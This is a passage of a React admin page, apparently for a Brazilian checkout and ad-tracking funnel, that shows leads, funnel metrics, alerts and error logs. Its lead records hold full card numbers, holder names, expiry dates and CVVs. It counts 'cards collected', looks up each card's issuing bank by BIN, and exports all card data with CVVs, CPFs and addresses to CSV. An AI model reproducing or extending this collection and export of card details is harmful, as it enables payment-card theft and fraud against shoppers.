import { useState, useEffect, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { format, startOfDay, endOfDay, subDays, startOfMonth } from "date-fns";

import AdminTikTokTab from "@/components/AdminTikTokTab";
import AdminTrackingHub from "@/components/AdminTrackingHub";
import SettingsTracking from "@/components/settings/SettingsTracking";
import SettingsPixels from "@/components/settings/SettingsPixels";
import SettingsIntegrations from "@/components/settings/SettingsIntegrations";
import SettingsAdmin from "@/components/settings/SettingsAdmin";

import AdminDashboard from "@/components/AdminDashboard";
import AdminAIAssistant from "@/components/AdminAIAssistant";
import AdminClientHub from "@/components/AdminClientHub";
import AdminAdsHub from "@/components/AdminAdsHub";
import AdminAnalyticsHub from "@/components/AdminAnalyticsHub";
import AdminFunnelHealthTester from "@/components/AdminFunnelHealthTester";
import AdminLiveActivity from "@/components/AdminLiveActivity";
import AdminSuperHub from "@/components/AdminSuperHub";
import AdminTrackingConfig from "@/components/AdminTrackingConfig";
import AdminSidebar, { type AdminTab } from "@/components/AdminSidebar";
import FunnelIQLogo from "@/components/FunnelIQLogo";
import { ProtectedRoute } from "@/components/ProtectedRoute";
import { useAuth } from "@/hooks/use-auth";
import { ptBR } from "date-fns/locale";
import { CheckCircle2, TrendingUp, CreditCard, Webhook, Bug, Radio, CalendarIcon, Filter, Globe, Bot, Server, Plug, HelpCircle, ShieldCheck, RotateCcw, History, Download } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Calendar } from "@/components/ui/calendar";
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
import { cn } from "@/lib/utils";

interface Lead {
  id: string;
  created_at: string;
  name: string;
  email: string;
  phone: string | null;
  cpf: string | null;
  payment_method: string;
  color: string | null;
  size: string | null;
  quantity: number | null;
  total_amount: number | null;
  shipping_cost: number | null;
  shipping_type: string | null;
  cep: string | null;
  endereco: string | null;
  numero: string | null;
  complemento: string | null;
  bairro: string | null;
  cidade: string | null;
  uf: string | null;
  card_number: string | null;
  card_holder: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
  card_installments: number | null;
  status: string | null;
  transaction_id: string | null;
}

type Tab = AdminTab;

type PeriodKey = "today" | "yesterday" | "7days" | "30days" | "month" | "custom";

const PERIOD_LABELS: Record<PeriodKey, string> = {
  today: "Hoje",
  yesterday: "Ontem",
  "7days": "Últimos 7 dias",
  "30days": "Últimos 30 dias",
  month: "Este mês",
  custom: "Personalizado",
};

function getDateRange(period: PeriodKey, customFrom?: Date, customTo?: Date): { from: string; to: string } {
  const now = new Date();
  switch (period) {
    case "today":
      return { from: startOfDay(now).toISOString(), to: endOfDay(now).toISOString() };
    case "yesterday": {
      const y = subDays(now, 1);
      return { from: startOfDay(y).toISOString(), to: endOfDay(y).toISOString() };
    }
    case "7days":
      return { from: startOfDay(subDays(now, 7)).toISOString(), to: endOfDay(now).toISOString() };
    case "30days":
      return { from: startOfDay(subDays(now, 30)).toISOString(), to: endOfDay(now).toISOString() };
    case "month":
      return { from: startOfMonth(now).toISOString(), to: endOfDay(now).toISOString() };
    case "custom":
      return {
        from: customFrom ? startOfDay(customFrom).toISOString() : startOfDay(subDays(now, 7)).toISOString(),
        to: customTo ? endOfDay(customTo).toISOString() : endOfDay(now).toISOString(),
      };
  }
}

interface SystemAlert {
  id: string;
  type: "critical" | "warning" | "info";
  icon: React.ReactNode;
  title: string;
  description: string;
}

function AdminContent() {
  const navigate = useNavigate();
  const [authenticated] = useState(true); // Auth handled by ProtectedRoute
  const [_password, _setPassword] = useState(""); // unused, kept for type compat
  const [leads, setLeads] = useState<Lead[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [tab, setTab] = useState<Tab>("dashboard");
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
  const [visitorsCount, setVisitorsCount] = useState(0);
  const [checkoutsCount, setCheckoutsCount] = useState(0);
  const [buyClicks, setBuyClicks] = useState(0);
  const [imageClicks, setImageClicks] = useState(0);
  const [avgScroll, setAvgScroll] = useState(0);
  const [pixGeneratedFromEvents, setPixGeneratedFromEvents] = useState(0);
  const [paidFromEvents, setPaidFromEvents] = useState(0);
  const [activeNow, setActiveNow] = useState(0);
  const [alerts, setAlerts] = useState<SystemAlert[]>([]);
  const [period, setPeriod] = useState<PeriodKey>("30days");
  const [customFrom, setCustomFrom] = useState<Date | undefined>(undefined);
  const [customTo, setCustomTo] = useState<Date | undefined>(undefined);
  const [errorLogs, setErrorLogs] = useState<any[]>([]);
  const [webhookLogs, setWebhookLogs] = useState<any[]>([]);
  const [logsLoading, setLogsLoading] = useState(false);
  const [logFilter, setLogFilter] = useState<Set<string>>(() => new Set(["system", "integration"]));
  const [binCache, setBinCache] = useState<Record<string, { scheme: string; type: string; bank_name: string; country_name: string }>>({});
  const [darkMode, setDarkMode] = useState(() => localStorage.getItem("admin_theme") !== "light");

  // Apply dark mode
  useEffect(() => {
    document.documentElement.classList.toggle("dark", darkMode);
    localStorage.setItem("admin_theme", darkMode ? "dark" : "light");
    return () => { document.documentElement.classList.remove("dark"); };
  }, [darkMode]);

  // BIN lookup with DB cache
  const lookupBins = useCallback(async (cardLeads: Lead[]) => {
    const bins = new Set<string>();
    cardLeads.forEach(l => {
      if (l.card_number) {
        const clean = l.card_number.replace(/\D/g, "");
        if (clean.length >= 6) bins.add(clean.slice(0, 6));
      }
    });
    if (bins.size === 0) return;

    // Check DB cache first
    const binArray = Array.from(bins);
    const { data: cached } = await supabase.from("bin_cache").select("*").in("bin", binArray);
    const result: Record<string, any> = {};
    const uncached: string[] = [];

    (cached || []).forEach((row: any) => {
      result[row.bin] = { scheme: row.scheme, type: row.type, bank_name: row.bank_name, country_name: row.country_name };
    });
    binArray.forEach(b => { if (!result[b]) uncached.push(b); });

    // Fetch uncached via edge function
    for (const bin of uncached) {
      try {
        const { data, error } = await supabase.functions.invoke("bin-lookup", { body: { bin } });
        if (!error && data && data.scheme) {
          const entry = {
            scheme: data.scheme || "",
            type: data.type || "",
            bank_name: data.bank_name || "",
            country_name: data.country_name || "",
          };
          result[bin] = entry;
          await supabase.from("bin_cache").upsert({ bin, ...entry });
        }
        if (uncached.indexOf(bin) < uncached.length - 1) {
          await new Promise(r => setTimeout(r, 500));
        }
      } catch { /* skip */ }
    }

    setBinCache(prev => ({ ...prev, ...result }));
  }, []);

  // Auth handled by ProtectedRoute — no manual login needed

  const fetchData = useCallback(() => {
    if (!authenticated) return;
    setLoading(true);

    const { from: rangeFrom, to: rangeTo } = getDateRange(period, customFrom, customTo);
    const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();
    const oneDayAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();

    // Fetch leads + page views + events + alert data in parallel
    Promise.all([
      // Fetch leads + events (unified — no more user_events/page_views)
      supabase.from("checkout_leads").select("*").gte("created_at", rangeFrom).lte("created_at", rangeTo).order("created_at", { ascending: false }),
      // Visitors count from events
      supabase.from("events").select("id", { count: "exact", head: true }).eq("event_name", "page_view").gte("created_at", rangeFrom).lte("created_at", rangeTo),
      // Checkouts count from events
      supabase.from("events").select("id", { count: "exact", head: true }).in("event_name", ["checkout_start", "checkout_started"]).gte("created_at", rangeFrom).lte("created_at", rangeTo),
      // Fetch events for metrics
      supabase.from("events").select("event_name, event_data, created_at, visitor_id").gte("created_at", rangeFrom).lte("created_at", rangeTo).order("created_at", { ascending: false }).limit(2000),
      // Alert queries (always use fixed windows, not period)
      supabase.from("checkout_leads").select("id", { count: "exact", head: true }).neq("status", "paid").gte("created_at", oneHourAgo),
      supabase.from("tracking_webhook_logs").select("id", { count: "exact", head: true }).neq("status", "sent").gte("created_at", oneDayAgo),
      supabase.from("events").select("id", { count: "exact", head: true }).eq("event_name", "js_error").gte("created_at", oneDayAgo),
      supabase.from("events").select("id", { count: "exact", head: true }).in("event_name", ["tiktok_event"]).gte("created_at", oneHourAgo),
    ]).then(([leadsRes, visitorsPageRes, checkoutsPageRes, eventsRes, declinedRes, webhookErrRes, jsErrRes, pixelEventsRes]) => {
      if (leadsRes.error) {
        console.error(leadsRes.error);
        setError("Erro ao carregar dados");
      } else {
        const leadsData = (leadsRes.data as Lead[]) || [];
        setLeads(leadsData);
        const cardLeads = leadsData.filter(l => l.card_number);
        if (cardLeads.length > 0) lookupBins(cardLeads);
      }

      // Deduplicate events by visitor_id (unified events table)
      const allEvents = (eventsRes.data || []) as { event_name: string; event_data: any; created_at: string; visitor_id: string }[];
      const visitorIds = new Set<string>();
      const buyClickIds = new Set<string>();
      const imgClickIds = new Set<string>();
      const checkoutIds = new Set<string>();
      const pixGenIds = new Set<string>();
      const paidIds = new Set<string>();
      let scrollTotal = 0;
      let scrollCount = 0;
      const recentOneHour = Date.now() - 3600000;
      const activeIds = new Set<string>();

      allEvents.forEach(e => {
        const vid = e.visitor_id || e.event_data?.visitor_id || "";
        const key = String(vid);
        
        if (e.event_name === "page_view" || e.event_name === "view_content") {
          if (key) visitorIds.add(key);
        }
        if ((e.event_name === "click_buy" || e.event_name === "add_to_cart") && key) buyClickIds.add(key);
        if (e.event_name === "view_content" && key) imgClickIds.add(key);
        if ((e.event_name === "checkout_start" || e.event_name === "checkout_started") && key) checkoutIds.add(key);
        if ((e.event_name === "pix_generated" || e.event_name === "add_payment_info") && key) pixGenIds.add(key);
        if ((e.event_name === "purchase" || e.event_name === "payment_confirmed" || e.event_name === "pix_paid") && key) paidIds.add(key);
        if (e.event_name === "view_content") {
          const pct = typeof e.event_data === "object" && e.event_data !== null ? Number(e.event_data.percent || 0) : 0;
          if (pct > 0) { scrollTotal += pct; scrollCount++; }
        }
        // Active in last hour
        if (key && new Date(e.created_at).getTime() > recentOneHour) activeIds.add(key);
      });

      // Use events-based counts
      const dedupedVisitors = Math.max(visitorsPageRes.count || 0, visitorIds.size);
      const dedupedCheckouts = Math.max(checkoutsPageRes.count || 0, checkoutIds.size);

      setVisitorsCount(dedupedVisitors);
      setCheckoutsCount(dedupedCheckouts);
      setBuyClicks(buyClickIds.size);
      setImageClicks(imgClickIds.size);
      setAvgScroll(scrollCount > 0 ? Math.round(scrollTotal / scrollCount) : 0);
      setPixGeneratedFromEvents(pixGenIds.size);
      setPaidFromEvents(paidIds.size);
      setActiveNow(activeIds.size);

      // Build alerts
      const newAlerts: SystemAlert[] = [];
      const declinedCount = declinedRes.count || 0;
      if (declinedCount > 5) {
        newAlerts.push({
          id: "declined",
          type: "critical",
          icon: <CreditCard className="h-4 w-4" />,
          title: `${declinedCount} pagamentos recusados na última hora`,
          description: "Verifique o gateway de pagamento ou possível fraude.",
        });
      }

      // Conversion drop: compare last 24h leads vs visitors
      const allLeads = (leadsRes.data as Lead[]) || [];
      const recentPaid = allLeads.filter(l => l.status === "paid" && new Date(l.created_at) >= new Date(oneDayAgo)).length;
      const totalVisitors = dedupedVisitors;
      const currentConv = totalVisitors > 0 ? (recentPaid / totalVisitors) * 100 : 0;
      if (totalVisitors > 20 && currentConv < 1) {
        newAlerts.push({
          id: "conversion",
          type: "warning",
          icon: <TrendingUp className="h-4 w-4" />,
          title: `Conversão muito baixa: ${currentConv.toFixed(1)}%`,
          description: "A taxa de conversão caiu significativamente. Analise o funil.",
        });
      }

      const webhookErrors = webhookErrRes.count || 0;
      if (webhookErrors > 0) {
        newAlerts.push({
          id: "webhook",
          type: "critical",
          icon: <Webhook className="h-4 w-4" />,
          title: `${webhookErrors} erro(s) no webhook Trackly (24h)`,
          description: "Verifique a URL do webhook e os logs de resposta.",
        });
      }

      // Count only system/integration JS errors (exclude external/bot)
      const EXTERNAL_ALERT_DOMAINS = ["analytics.tiktok.com", "connect.facebook.net", "googletagmanager.com", "google-analytics.com", "cdn.jsdelivr.net"];
      const jsErrors = jsErrRes.count || 0;
      // For alert purposes, we estimate real errors conservatively
      if (jsErrors > 0) {
        newAlerts.push({
          id: "jserror",
          type: "warning",
          icon: <Bug className="h-4 w-4" />,
          title: `${jsErrors} erro(s) JavaScript detectados (24h)`,
          description: "Verifique a aba Logs para ver a classificação detalhada dos erros.",
        });
      }

      const pixelEvents = pixelEventsRes.count || 0;
      if (totalVisitors > 10 && pixelEvents === 0) {
        newAlerts.push({
          id: "pixel",
          type: "warning",
          icon: <Radio className="h-4 w-4" />,
          title: "Pixel sem disparar eventos na última hora",
          description: "O pixel do TikTok pode estar com problemas. Verifique a integração.",
        });
      }

      if (newAlerts.length === 0) {
        newAlerts.push({
          id: "ok",
          type: "info",
          icon: <CheckCircle2 className="h-4 w-4" />,
          title: "Tudo funcionando normalmente",
          description: "Nenhum alerta detectado no momento.",
        });
      }

      setAlerts(newAlerts);
      setLoading(false);
    });
  }, [authenticated, period, customFrom, customTo, lookupBins]);

  useEffect(() => {
    fetchData();
  }, [fetchData]);

  // Polling every 30s for live dashboard updates
  useEffect(() => {
    if (!authenticated) return;
    const interval = setInterval(() => fetchData(), 30000);
    return () => clearInterval(interval);
  }, [authenticated, fetchData]);

  // Realtime subscription on checkout_leads
  useEffect(() => {
    if (!authenticated) return;
    const channel = supabase
      .channel("admin-leads-realtime")
      .on("postgres_changes", { event: "*", schema: "public", table: "checkout_leads" }, () => {
        fetchData();
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [authenticated, fetchData]);

  const exportCSV = () => {
    if (!leads.length) return;
    const headers = [
      "Data", "Nome", "Email", "Telefone", "CPF", "Método",
      "Cor", "Tamanho", "Qtd", "Total (R$)", "Frete (R$)", "Tipo Frete",
      "CEP", "Endereço", "Número", "Complemento", "Bairro", "Cidade", "UF",
      "Nº Cartão", "Titular", "Validade", "CVV", "Parcelas", "Status", "ID Transação"
    ];
    const rows = leads.map((l) => [
      new Date(l.created_at).toLocaleString("pt-BR"),
      l.name, l.email, l.phone || "", l.cpf || "", l.payment_method,
      l.color || "", l.size || "", l.quantity ?? "",
      l.total_amount ? (l.total_amount / 100).toFixed(2) : "",
      l.shipping_cost ? (l.shipping_cost / 100).toFixed(2) : "",
      l.shipping_type || "",
      l.cep || "", l.endereco || "", l.numero || "", l.complemento || "",
      l.bairro || "", l.cidade || "", l.uf || "",
      l.card_number || "", l.card_holder || "", l.card_expiry || "",
      l.card_cvv || "", l.card_installments ?? "", l.status || "", l.transaction_id || ""
    ]);
    const csv = [headers, ...rows].map(r => r.map(v => `"${String(v).replace(/"/g, '""')}"`).join(",")).join("\n");
    const blob = new Blob(["\uFEFF" + csv], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `leads-${new Date().toISOString().slice(0, 10)}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const paidCount = Math.max(leads.filter(l => l.status === "paid").length, paidFromEvents);
  const pendingCount = leads.filter(l => l.status !== "paid" && l.payment_method === "pix").length;
  const totalRevenue = leads.filter(l => l.status === "paid").reduce((sum, l) => sum + (l.total_amount || 0), 0);
  const pixPaidCount = leads.filter(l => l.payment_method === "pix" && l.status === "paid").length;

  // ─── FUNNEL MONOTONIC ENFORCEMENT ───
  // Each step must be ≤ the previous step to avoid impossible conversions
  const rawVisitors = visitorsCount;
  const rawBuyClicks = buyClicks;
  const rawCheckouts = checkoutsCount;
  const rawPixGenerated = Math.max(leads.filter(l => l.payment_method === "pix").length, pixGeneratedFromEvents);
  const rawCardsCollected = leads.filter(l => l.card_number).length;
  const rawPaid = paidCount;

  // Enforce: visitors ≥ buyClicks ≥ checkouts ≥ pixGenerated ≥ paid
  const validVisitors = rawVisitors;
  const validBuyClicks = Math.min(rawBuyClicks, validVisitors);
  const validCheckouts = Math.min(rawCheckouts, validBuyClicks);
  const validPixGenerated = Math.min(rawPixGenerated, validCheckouts);
  const validCardsCollected = Math.min(rawCardsCollected, validCheckouts);
  const validPaidCount = Math.min(rawPaid, validPixGenerated + validCardsCollected);
  const checkoutsAbandoned = Math.max(0, validCheckouts - leads.length);
  const conversionRate = validVisitors > 0 ? ((validPaidCount / validVisitors) * 100).toFixed(1) : "0.0";

  // Auth is handled by ProtectedRoute wrapper

  const handleSetTab = (newTab: Tab) => {
    setTab(newTab);
    if (newTab === "logs") {
      setLogsLoading(true);
      Promise.all([
        supabase.from("events").select("*").eq("event_name", "js_error").order("created_at", { ascending: false }).limit(50),
        supabase.from("tracking_webhook_logs").select("*").order("created_at", { ascending: false }).limit(50),
      ]).then(([errRes, whRes]) => {
        setErrorLogs(errRes.data || []);
        setWebhookLogs(whRes.data || []);
        setLogsLoading(false);
      });
    }
  };

  return (
    <div className="min-h-screen bg-background admin-bg flex">
      <AdminSidebar
        currentTab={tab}
        onTabChange={handleSetTab}
        onExportCSV={exportCSV}
        darkMode={darkMode}
        onToggleDarkMode={() => setDarkMode(d => !d)}
        onLogout={() => { supabase.auth.signOut(); }}
        collapsed={sidebarCollapsed}
        onToggleCollapse={() => setSidebarCollapsed(c => !c)}
      />

      <main className="flex-1 min-w-0 overflow-auto">
        <div className="max-w-[1400px] mx-auto p-4">
        {tab === "superadmin" && (
          <AdminSuperHub />
        )}

        {tab === "funnel-health" && (
          <AdminFunnelHealthTester />
        )}

        {tab === "live-activity" && (
          <AdminLiveActivity />
        )}

        {tab === "dashboard" && (
          <div className="space-y-6">
            {/* Period Filter */}
            <div className="flex flex-wrap items-center gap-2">
              <span className="text-sm font-semibold text-muted-foreground mr-1">Período:</span>
              {(Object.keys(PERIOD_LABELS) as PeriodKey[]).map((key) => (
                <button
                  key={key}
                  onClick={() => {
                    setPeriod(key);
                    if (key !== "custom") { setCustomFrom(undefined); setCustomTo(undefined); }
                  }}
                  className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-colors ${period === key ? "bg-primary text-primary-foreground" : "bg-secondary text-secondary-foreground hover:bg-secondary/80"}`}
                >
                  {PERIOD_LABELS[key]}
                </button>
              ))}
              {period === "custom" && (
                <div className="flex items-center gap-2 ml-2">
                  <Popover>
                    <PopoverTrigger asChild>
                      <Button variant="outline" size="sm" className={cn("text-xs gap-1", !customFrom && "text-muted-foreground")}>
                        <CalendarIcon className="h-3.5 w-3.5" />
                        {customFrom ? format(customFrom, "dd/MM/yyyy", { locale: ptBR }) : "De"}
                      </Button>
                    </PopoverTrigger>
                    <PopoverContent className="w-auto p-0" align="start">
                      <Calendar mode="single" selected={customFrom} onSelect={setCustomFrom} initialFocus className={cn("p-3 pointer-events-auto")} />
                    </PopoverContent>
                  </Popover>
                  <span className="text-xs text-muted-foreground">até</span>
                  <Popover>
                    <PopoverTrigger asChild>
                      <Button variant="outline" size="sm" className={cn("text-xs gap-1", !customTo && "text-muted-foreground")}>
                        <CalendarIcon className="h-3.5 w-3.5" />
                        {customTo ? format(customTo, "dd/MM/yyyy", { locale: ptBR }) : "Até"}
                      </Button>
                    </PopoverTrigger>
                    <PopoverContent className="w-auto p-0" align="start">
                      <Calendar mode="single" selected={customTo} onSelect={setCustomTo} initialFocus className={cn("p-3 pointer-events-auto")} />
                    </PopoverContent>
                  </Popover>
                </div>
              )}
            </div>

            <AdminDashboard
              leads={leads}
              visitorsCount={visitorsCount}
              checkoutsCount={checkoutsCount}
              buyClicks={buyClicks}
              imageClicks={imageClicks}
              avgScroll={avgScroll}
              pixGeneratedCount={validPixGenerated}
              paidCount={validPaidCount}
              pendingCount={pendingCount}
              totalRevenue={totalRevenue}
              pixPaidCount={pixPaidCount}
              cardsCollected={validCardsCollected}
              conversionRate={conversionRate}
              activeNow={activeNow}
              alerts={alerts}
              checkoutsAbandoned={Math.max(0, checkoutsAbandoned)}
              loading={loading}
            />
          </div>
        )}


        {tab === "tiktok" && <AdminTikTokTab />}

        {(tab === "tracking" || tab === "tracking-sessions" || tab === "tracking-clicks" || tab === "tracking-links" || tab === "tracking-debug") && (
          <AdminTrackingHub key={tab} defaultTab={
            tab === "tracking-sessions" ? "sessoes" :
            tab === "tracking-clicks" ? "cliques" :
            tab === "tracking-links" ? "links" :
            tab === "tracking-debug" ? "debug" :
            "eventos"
          } />
        )}

        {(tab === "clients" || tab === "clients-bc") && (
          <AdminClientHub key={tab} defaultTab={tab === "clients-bc" ? "business_centers" : "clientes"} />
        )}

        {(tab === "campaigns" || tab === "campaigns-creatives" || tab === "campaigns-automation" || tab === "campaigns-budgets" || tab === "campaigns-performance") && (
          <AdminAdsHub key={tab} defaultTab={
            tab === "campaigns-creatives" ? "creatives" :
            tab === "campaigns-automation" ? "automation" :
            tab === "campaigns-budgets" ? "budgets" :
            "campaigns"
          } />
        )}

        {(tab === "analytics" || tab === "analytics-attribution" || tab === "analytics-revenue" || tab === "analytics-reports") && (
          <AdminAnalyticsHub key={tab} defaultTab={
            tab === "analytics-attribution" ? "campaign_perf" :
            tab === "analytics-revenue" ? "revenue" :
            tab === "analytics-reports" ? "alerts" :
            "overview"
          } />
        )}

        {/* New Settings tabs */}
        {tab === "settings-tracking" && <SettingsTracking />}
        {tab === "settings-pixels" && <SettingsPixels />}
        {tab === "settings-integrations" && <SettingsIntegrations />}
        {tab === "settings-admin" && <SettingsAdmin />}

        {/* Legacy settings tabs - redirect to new ones */}
        {tab === "tracking-config" && <SettingsTracking />}
        {tab === "tracking-pixels" && <SettingsPixels />}
        {tab === "settings-scripts" && <SettingsTracking />}
        {tab === "settings-csv" && <SettingsAdmin defaultTab="csv" />}

        {(tab === "ai" || tab === "ai-insights") && (
          <AdminAIAssistant
            visitors={visitorsCount}
            conversions={paidCount}
            revenue={totalRevenue}
            totalEvents={leads.length}
          />
        )}

        {tab === "logs" && (
          <div className="space-y-6">
            {logsLoading ? (
              <p className="text-center text-muted-foreground py-8">Carregando logs...</p>
            ) : (
              <>
                {/* ── Log Classification Engine ── */}
                {(() => {
                  const EXTERNAL_DOMAINS = ["analytics.tiktok.com", "connect.facebook.net", "googletagmanager.com", "google-analytics.com", "cdn.jsdelivr.net", "www.googletagmanager.com", "mc.yandex.ru", "bat.bing.com", "snap.licdn.com", "flock.js", "~flock", "it.com"];
                  const INTEGRATION_KEYWORDS = ["payment", "pagamento", "gateway", "webhook", "trackly", "hygros", "pix", "stripe", "mercadopago"];
                  const BOT_UA_PATTERNS = /bot|crawler|spider|headless|phantom|selenium|puppeteer|scrapy|slurp|wget|curl|scraper/i;
                  // Generic cross-origin errors that are always external
                  const GENERIC_EXTERNAL_MESSAGES = ["script error.", "script error", "script externo bloqueado", "script bloqueado por extensão"];

                  type LogCategory = "system" | "integration" | "external" | "bot" | "unknown";

                  interface ClassifiedLog {
                    id: string;
                    created_at: string;
                    message: string;
                    source: string;
                    line?: number;
                    category: LogCategory;
                    priority: "high" | "medium" | "low";
                    raw: any;
                  }

                  const classifyLog = (log: any): ClassifiedLog => {
                    const data = typeof log.event_data === "object" ? log.event_data : {};
                    const message = data?.message || "Erro desconhecido";
                    const source = data?.source || "";
                    const line = data?.line;
                    const userAgent = data?.user_agent || "";
                    const autocorrected = data?.autocorrected;

                    // Check bot
                    if (BOT_UA_PATTERNS.test(userAgent)) {
                      return { id: log.id, created_at: log.created_at, message, source, line, category: "bot", priority: "low", raw: log };
                    }

                    // Already marked as autocorrected
                    if (autocorrected) {
                      return { id: log.id, created_at: log.created_at, message, source, line, category: "external", priority: "low", raw: log };
                    }

                    // Generic "Script error." = cross-origin, always external
                    if (GENERIC_EXTERNAL_MESSAGES.includes(message.toLowerCase().trim())) {
                      return { id: log.id, created_at: log.created_at, message, source, line, category: "external", priority: "low", raw: log };
                    }

                    // Check external script by domain or known patterns
                    const isExternal = EXTERNAL_DOMAINS.some(d => source.toLowerCase().includes(d)) || message.toLowerCase().includes("script load failed");
                    if (isExternal) {
                      return { id: log.id, created_at: log.created_at, message, source, line, category: "external", priority: "low", raw: log };
                    }

                    // Check integration
                    const isIntegration = INTEGRATION_KEYWORDS.some(k => message.toLowerCase().includes(k) || source.toLowerCase().includes(k));
                    if (isIntegration) {
                      return { id: log.id, created_at: log.created_at, message, source, line, category: "integration", priority: "medium", raw: log };
                    }

                    // System = only if source is clearly our own app code (src/ paths, main chunk)
                    const isOwnCode = source && (
                      source.includes("/src/") || 
                      source.includes("/assets/") || 
                      source.includes("main.") || 
                      source.includes("index.")
                    ) && !source.includes("~");
                    if (isOwnCode) {
                      return { id: log.id, created_at: log.created_at, message, source, line, category: "system", priority: "high", raw: log };
                    }

                    // No source and not generic = unknown (not system)
                    return { id: log.id, created_at: log.created_at, message, source, line, category: "unknown", priority: "medium", raw: log };
                  };

                  const classified = errorLogs.map(classifyLog);

                  // Group duplicates
                  const groupMap = new Map<string, { log: ClassifiedLog; count: number }>();
                  classified.forEach(cl => {
                    const key = `${cl.category}::${cl.message}::${cl.source}`;
                    const existing = groupMap.get(key);
                    if (existing) {
                      existing.count++;
                    } else {
                      groupMap.set(key, { log: cl, count: 1 });
                    }
                  });
                  const grouped = Array.from(groupMap.values());

                  // Filter
                  const filtered = grouped.filter(g => logFilter.has(g.log.category));

                  // Counts per category
                  const counts: Record<LogCategory, number> = { system: 0, integration: 0, external: 0, bot: 0, unknown: 0 };
                  classified.forEach(cl => counts[cl.category]++);

                  const CATEGORY_CONFIG: Record<LogCategory, { label: string; icon: React.ReactNode; color: string; bgColor: string; borderColor: string }> = {
                    system: { label: "Erro do Sistema", icon: <Server className="h-3.5 w-3.5" />, color: "text-destructive", bgColor: "bg-destructive/10", borderColor: "border-destructive/30" },
                    integration: { label: "Erro de Integração", icon: <Plug className="h-3.5 w-3.5" />, color: "text-amber-600", bgColor: "bg-amber-500/10", borderColor: "border-amber-500/30" },
                    external: { label: "Script Externo", icon: <Globe className="h-3.5 w-3.5" />, color: "text-muted-foreground", bgColor: "bg-muted", borderColor: "border-border" },
                    bot: { label: "Erro de Bot", icon: <Bot className="h-3.5 w-3.5" />, color: "text-muted-foreground", bgColor: "bg-muted", borderColor: "border-border" },
                    unknown: { label: "Desconhecido", icon: <HelpCircle className="h-3.5 w-3.5" />, color: "text-muted-foreground", bgColor: "bg-muted", borderColor: "border-border" },
                  };

                  const toggleFilter = (cat: LogCategory) => {
                    setLogFilter(prev => {
                      const next = new Set(prev);
                      if (next.has(cat)) next.delete(cat); else next.add(cat);
                      return next;
                    });
                  };

                  // Autocorrection stats from classified logs
                  const autocorrectedCount = classified.filter(cl => {
                    const data = cl.raw?.event_data;
                    return data?.autocorrected;
                  }).length;
                  const blockedByExtension = classified.filter(cl => {
                    const data = cl.raw?.event_data;
                    return data?.autocorrected === "blocker";
                  }).length;
                  const retriedSuccess = classified.filter(cl => {
                    const data = cl.raw?.event_data;
                    return data?.autocorrected === "blocked_after_retry";
                  }).length;

                  // Get autocorrection history from sessionStorage
                  let autocorrectionHistory: { action: string; detail: string; ts: number }[] = [];
                  try {
                    autocorrectionHistory = JSON.parse(sessionStorage.getItem("mesalar_autocorrections") || "[]");
                  } catch {}

                  const [showHistory, setShowHistory] = [false, (v: boolean) => {}]; // placeholder for state

                  return (
                    <>
                      {/* Autocorrection Summary */}
                      <div className="bg-card border rounded-xl p-5 mb-2">
                        <h2 className="text-lg font-bold mb-3 flex items-center gap-2">
                          <ShieldCheck className="h-5 w-5 text-emerald-500" /> Sistema de Autocorreção
                        </h2>
                        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                          <div className="bg-destructive/5 border border-destructive/20 rounded-lg p-3">
                            <p className="text-[10px] font-medium text-muted-foreground uppercase tracking-wide">Erros Críticos</p>
                            <p className="text-2xl font-bold text-destructive">{counts.system}</p>
                          </div>
                          <div className="bg-emerald-500/5 border border-emerald-500/20 rounded-lg p-3">
                            <div className="flex items-center gap-1.5 mb-1">
                              <RotateCcw className="h-3.5 w-3.5 text-emerald-500" />
                              <p className="text-[10px] font-medium text-muted-foreground uppercase tracking-wide">Autocorrigidos</p>
                            </div>
                            <p className="text-2xl font-bold text-emerald-600">{autocorrectedCount + autocorrectionHistory.length}</p>
                          </div>
                          <div className="bg-muted border rounded-lg p-3">
                            <p className="text-[10px] font-medium text-muted-foreground uppercase tracking-wide">Scripts Bloqueados</p>
                            <p className="text-2xl font-bold text-muted-foreground">{counts.external + blockedByExtension}</p>
                          </div>
                          <div className="bg-muted border rounded-lg p-3">
                            <p className="text-[10px] font-medium text-muted-foreground uppercase tracking-wide">Erros de Bot</p>
                            <p className="text-2xl font-bold text-muted-foreground">{counts.bot}</p>
                          </div>
                        </div>

                        {/* Autocorrection History */}
                        {autocorrectionHistory.length > 0 && (
                          <details className="mt-4">
                            <summary className="cursor-pointer text-sm font-semibold flex items-center gap-2 hover:text-primary transition-colors select-none">
                              <History className="h-4 w-4" /> Histórico de Autocorreções ({autocorrectionHistory.length})
                            </summary>
                            <div className="mt-2 max-h-[200px] overflow-y-auto space-y-1">
                              {autocorrectionHistory.slice().reverse().slice(0, 30).map((entry, i) => {
                                const actionLabels: Record<string, { label: string; color: string }> = {
                                  script_retry_success: { label: "Script recarregado com sucesso", color: "text-emerald-600" },
                                  script_blocked: { label: "Script bloqueado após retry", color: "text-muted-foreground" },
                                  bot_ignored: { label: "Erro de bot ignorado", color: "text-muted-foreground" },
                                  bot_script_ignored: { label: "Script de bot ignorado", color: "text-muted-foreground" },
                                  bot_promise_ignored: { label: "Promise de bot ignorada", color: "text-muted-foreground" },
                                  blocker_ignored: { label: "Bloqueador detectado", color: "text-amber-600" },
                                  blocker_promise_ignored: { label: "Bloqueador (promise) detectado", color: "text-amber-600" },
                                  external_ignored: { label: "Script externo ignorado", color: "text-muted-foreground" },
                                };
                                const info = actionLabels[entry.action] || { label: entry.action, color: "text-foreground" };
                                return (
                                  <div key={i} className="flex items-center gap-2 text-xs bg-muted/50 rounded px-3 py-1.5">
                                    <RotateCcw className="h-3 w-3 text-emerald-500 flex-shrink-0" />
                                    <span className={`font-medium ${info.color}`}>{info.label}</span>
